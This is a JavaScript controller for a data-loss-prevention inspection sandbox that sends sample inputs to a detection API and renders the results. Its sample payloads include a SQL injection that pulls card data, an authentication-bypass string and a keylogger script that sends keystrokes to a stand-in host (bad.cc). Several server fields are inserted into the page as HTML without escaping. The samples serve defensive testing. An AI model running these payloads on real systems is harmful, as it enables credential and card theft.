/**
 * Inspection Sandbox Controller
 * Interactive deep content & contextual inspection testing terminal
 */

const Sandbox = {
  samplePayloads: {
    SQL_QUERY: "' UNION SELECT id, username, credit_card_encrypted FROM customer_profiles --",
    USER_CHAT: "Dear support, please credit my account: Visa 4532718293847561, SSN: 234-56-7890",
    AUTH_LOGIN: "admin' OR '1'='1' --",
    CHECKOUT: "<script>window.addEventListener('keypress', function(e){ fetch('http://bad.cc?k='+e.key); });</script>"
  },

  init() {
    this.setupSandbox();
  },

  setupSandbox() {
    const runBtn = document.getElementById('btn-run-sandbox');
    const loadSampleBtn = document.getElementById('btn-sandbox-load-sample');
    const contextSelect = document.getElementById('sandbox-context-select');
    const payloadInput = document.getElementById('sandbox-payload-input');

    if (loadSampleBtn && contextSelect && payloadInput) {
      loadSampleBtn.addEventListener('click', () => {
        const selectedContext = contextSelect.value;
        payloadInput.value = this.samplePayloads[selectedContext] || this.samplePayloads.SQL_QUERY;
      });

      contextSelect.addEventListener('change', () => {
        const selectedContext = contextSelect.value;
        payloadInput.value = this.samplePayloads[selectedContext] || this.samplePayloads.SQL_QUERY;
      });
    }

    if (runBtn) {
      runBtn.addEventListener('click', () => {
        this.runInspection();
      });
    }
  },

  async runInspection() {
    const payload = document.getElementById('sandbox-payload-input').value.trim();
    const context = document.getElementById('sandbox-context-select').value;
    const simContextual = document.getElementById('sandbox-sim-context').checked;
    const outputPanel = document.getElementById('sandbox-output-panel');

    if (!payload) {
      App.showToast('Empty Payload', 'warning', 'Please enter a query or string to inspect.');
      return;
    }

    outputPanel.innerHTML = '<div style="text-align: center; padding: 2rem; color: var(--cyan-primary);">Running Content Inspection & Contextual Analysis...</div>';

    try {
      const res = await fetch('/api/dlp/inspect-payload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          payload,
          context,
          simulateContextual: simContextual
        })
      });

      const data = await res.json();
      if (data.success) {
        this.renderResults(data, outputPanel);
      }
    } catch (err) {
      outputPanel.innerHTML = `<div style="color: var(--rose-danger); padding: 1.5rem;">Inspection Error: ${err.message}</div>`;
    }
  },

  renderResults(data, container) {
    const { contentReport, contextualReport, aesxSampleEncryption } = data;
    const isThreat = contentReport.isThreat;
    const threatClass = `badge-${contentReport.threatLevel?.toLowerCase() || 'clean'}`;

    container.innerHTML = `
      <div style="display: flex; align-items: center; justify-content: space-between; padding-bottom: 0.8rem; border-bottom: 1px solid var(--border-subtle);">
        <div style="display: flex; align-items: center; gap: 0.6rem;">
          <span style="font-weight: 700; font-size: 1.1rem;">Inspection Verdict:</span>
          <span class="badge ${threatClass}">${contentReport.threatLevel}</span>
        </div>
        <div>
          <span class="badge" style="background: rgba(0, 240, 255, 0.15); color: var(--cyan-primary);">
            Action: ${contentReport.recommendedAction}
          </span>
        </div>
      </div>

      <!-- Risk Score Meter -->
      <div style="margin-top: 0.4rem;">
        <div style="display: flex; justify-content: space-between; font-size: 0.8rem; margin-bottom: 0.3rem;">
          <span style="color: var(--text-muted);">Content Threat Contribution:</span>
          <span style="font-weight: 700; color: ${isThreat ? 'var(--rose-danger)' : 'var(--emerald-success)'};">
            ${contentReport.score} / 100
          </span>
        </div>
        <div class="risk-meter">
          <div class="risk-bar" style="width: ${contentReport.score}%; background: ${isThreat ? 'var(--rose-danger)' : 'var(--emerald-success)'};"></div>
        </div>
      </div>

      <!-- Matched Rules Breakdown -->
      <div>
        <h4 style="font-size: 0.9rem; margin-bottom: 0.6rem; color: var(--text-main);">
          Matched Detection Rules (${contentReport.matches?.length || 0}):
        </h4>
        ${contentReport.matches?.length > 0 ? `
          <div style="display: flex; flex-direction: column; gap: 0.6rem;">
            ${contentReport.matches.map(m => `
              <div style="background: rgba(10, 16, 30, 0.7); border: 1px solid rgba(244, 63, 94, 0.25); border-radius: var(--radius-sm); padding: 0.75rem;">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.3rem;">
                  <strong style="color: #fca5a5; font-size: 0.85rem;">${m.ruleName}</strong>
                  <span class="badge badge-${m.severity.toLowerCase()}">${m.severity} (+${m.riskScore})</span>
                </div>
                <div style="font-size: 0.78rem; color: var(--text-muted); margin-bottom: 0.4rem;">${m.description}</div>
                <div style="font-size: 0.75rem; font-family: var(--font-mono); color: var(--cyan-primary);">
                  Flagged Token: <code>${m.matchedToken.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code>
                </div>
              </div>
            `).join('')}
          </div>
        ` : `
          <div style="background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.2); border-radius: var(--radius-sm); padding: 0.8rem; font-size: 0.82rem; color: var(--emerald-success);">
            ✓ Zero malicious signatures identified. Payload satisfies DLP data safety policies.
          </div>
        `}
      </div>

      <!-- Contextual Behavioral Simulation -->
      ${contextualReport ? `
        <div style="border-top: 1px solid var(--border-subtle); padding-top: 0.8rem;">
          <h4 style="font-size: 0.9rem; margin-bottom: 0.4rem; color: var(--purple-accent);">
            Contextual Behavioral Evaluation:
          </h4>
          <div style="font-size: 0.82rem; display: grid; grid-template-columns: 1fr 1fr; gap: 0.5rem; background: rgba(13, 20, 36, 0.6); padding: 0.7rem; border-radius: var(--radius-sm);">
            <div>User Risk Score: <strong>${contextualReport.currentRiskScore}/100</strong></div>
            <div>Category: <strong style="color: ${contextualReport.newCategory === 'Assaulter' ? 'var(--rose-danger)' : 'var(--emerald-success)'};">${contextualReport.newCategory}</strong></div>
            <div>Enforcement Status: <strong>${contextualReport.status}</strong></div>
            <div>Honeypot Decoy: <strong>${contextualReport.honeypotActive ? 'ACTIVE' : 'INACTIVE'}</strong></div>
          </div>
        </div>
      ` : ''}

      <!-- AESX Ciphertext Preview -->
      <div style="border-top: 1px solid var(--border-subtle); padding-top: 0.8rem;">
        <h4 style="font-size: 0.9rem; margin-bottom: 0.4rem; color: var(--cyan-primary);">
          AESX Cloud Storage Ciphertext:
        </h4>
        <div class="code-block" style="font-size: 0.75rem; color: #38bdf8;">
          ${aesxSampleEncryption}
        </div>
      </div>
    `;
  }
};

window.addEventListener('DOMContentLoaded', () => {
  Sandbox.init();
});
